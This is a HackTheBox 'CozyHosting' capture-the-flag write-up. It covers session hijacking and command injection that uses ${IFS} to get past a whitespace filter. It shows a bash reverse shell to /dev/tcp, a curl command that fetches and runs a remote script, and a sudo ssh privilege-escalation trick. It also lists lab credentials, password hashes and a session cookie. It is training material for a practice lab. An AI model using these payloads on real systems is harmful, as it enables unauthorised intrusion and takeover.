---
title: "CozyHosting"
date: 2026-02-19
draft: false
description: "HackTheBox CozyHosting writeup"
tags: ["hackthebox", "htb", "linux", "easy", "oscp"]
categories: ["CTF Writeups"]
showTableOfContents: true
showReadingTime: true
showWordCount: true
---

# CozyHosting

## Overview

- **OS:** Linux
- **IP:** 10.129.229.88
- **Difficulty:** Easy
- **Platform:** HackTheBox
- **OSCP:** Yes
- **Lists:** N/A

### Summary

found exposed endpoint that gave us a session, used session and got in with RCE that bypassed whitespacefiltering, found jar file with archive containing db creds, used db creds to find hashes, cracked hash for ssh cred, found sudo -l lets us run binary shsh with root, elevarted with proxychain command.

## Loot

| **Takeaways** |  |
| --- | --- |
| **Category** | **Details** |
| Usernames+Passwords | info@cozyhosting.htb

postgres:Vg&nvzAQ7XxR
josh@cozyhosting.htb
 |
| Hashes | kanderson 
$2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim

admin $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm |
| Sessions | kanderson:B1FB7155CC956000B44F256C81194FAA |
## Enumeration
- **nmap**

{{< figure src="image 364.png" >}}

- **dirb**

{{< figure src="image 365.png" >}}

- **sub**

nothing interestin w wfuzz

- **80**

South Jakarta City 12120,
Jakarta, Indonesia <br><br>
<strong>Phone:</strong> +62 5589 55488 55<br>
<strong>Email:</strong> info@cozyhosting.htb<br>

/admin

{{< figure src="image 366.png" >}}

because of this whitelabel thing we identified that the framework being using is springboot, lets fuzz for more endpoints

{{< figure src="image 367.png" >}}

## Exploitation


On visiting this exposed endpoint we find this user kandersons session

kanderson

B1FB7155CC956000B44F256C81194FAA

{{< figure src="image 368.png" >}}

lets edit our browsers cookies

{{< figure src="image 369.png" >}}

we should be able to access now

{{< figure src="image 370.png" >}}

there is this place where we can use ssh 

{{< figure src="image 371.png" >}}

since my connection keeps breaking ill refer to 0xdfs blog

{{< figure src="image 372.png" >}}

{{< figure src="image 373.png" >}}

Lets host our revshell locally

```
    #!/bin/bash
    
    bash -i >& /dev/tcp/10.10.14.6/443 0>&1
```

now lets use user as localhost

and username as 

```
    muqf%3bcurl${IFS}http: // 10 . 10 . 14 . 41/ rev . sh${IFS}-o${IFS}/tmp/rev.sh
```

now lets send another request to run it

```
    muq%3bbash${IFS}/tmp/rev.sh
```

and Boom we have a shell

found this in the jar file located withing /app directory because i noticed earlier in the env dir it was referencing to this

{{< figure src="image 374.png" >}}

{{< figure src="image 375.png" >}}

we have the creds for postgres and we know that it is running on this port

{{< figure src="image 376.png" >}}

lets portforward the port 5432 and access the postgresDB

we see these two tables in the cozyhosting db 

{{< figure src="image 377.png" >}}

{{< figure src="image 378.png" >}}

{{< figure src="image 379.png" >}}

lets try a different mode

and the password for admin is 

`manchesterunited`

we find that when we ssh w user as john it works so lets pop a shell

{{< figure src="image 380.png" >}}

damn so we can run the ssh binary?

gtfo bins gives us this proxy thing that instantly drops root

{{< figure src="image 381.png" >}}
